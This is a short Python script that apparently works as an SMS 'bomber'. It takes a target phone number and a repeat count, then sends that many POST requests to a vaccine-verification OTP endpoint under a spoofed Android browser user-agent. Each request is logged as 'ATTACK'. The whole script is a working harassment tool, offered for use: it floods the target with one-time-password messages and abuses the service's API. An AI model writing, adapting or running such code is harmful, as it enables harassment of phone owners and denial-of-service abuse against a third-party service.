import requests

print(''' 
╭━━━╮
┃╭━━╯
┃╰━━┳━┳━┳━━┳━╮
┃╭━━┫╭┫╭┫╭╮┃╭╯
┃╰━━┫┃┃┃┃╰╯┃┃
╰━━━┻╯╰╯╰━━┻╯''')
print("")
print(" FB :  ท่าน กัส")
print("")
a=input("number: ")
print("")
b=int(input("num: "))
print("")

for i in range(b):
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":a,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print(f"ATTACK | {a} | ez1api✓")